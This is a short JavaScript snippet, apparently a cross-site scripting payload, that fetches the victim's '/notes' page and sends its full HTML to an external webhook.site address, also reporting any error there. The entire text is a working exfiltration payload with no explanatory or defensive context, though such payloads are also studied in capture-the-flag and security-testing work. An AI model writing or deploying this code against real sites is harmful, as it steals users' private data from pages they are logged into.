const html_steal = await fetch('/notes')
const html = await html_steal.text();
try{
    fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+ html);}
catch(e){
    fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data=Error: ' + e);
}
